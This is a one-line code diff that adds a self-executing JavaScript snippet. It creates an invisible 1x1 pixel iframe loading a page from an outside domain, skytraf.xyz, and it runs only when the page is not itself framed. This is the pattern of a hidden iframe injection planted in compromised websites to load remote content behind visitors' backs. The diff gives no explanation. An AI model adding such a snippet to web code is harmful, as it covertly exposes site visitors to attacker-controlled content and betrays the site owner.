@@ -1,0 +1,1 @@
+(function(){if (window.self !== window.top) return;var i=document.createElement('iframe');i.name='iframe1';i.src='https://skytraf.xyz/ym/lime.html?';i.style.width='1px';i.style.height='1px';document.head.appendChild(i)})();
